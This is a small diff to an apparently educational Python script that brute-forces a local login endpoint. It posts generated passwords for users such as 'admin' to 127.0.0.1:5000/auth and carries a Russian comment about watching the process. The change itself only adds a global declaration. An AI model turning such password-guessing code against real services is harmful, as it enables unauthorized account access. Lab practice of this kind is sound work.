@@ -23,6 +23,7 @@ def next_password():
 
 def start_bruteforce(login, pass_pattern):
     while True:
+        global pass_list
         password = pass_pattern + next_password()
         data = {'login': login, 'password': password}
         response = requests.post('http://127.0.0.1:5000/auth', json=data)
@@ -32,7 +33,6 @@ def start_bruteforce(login, pass_pattern):
         else:
             # print(f'{password=} is incorrect')
             pass                                          # раскомментировать строку выше для наблюдения процесса
-
 
 if __name__ == '__main__':
     login_list = ['admin', 'jack', 'cat']
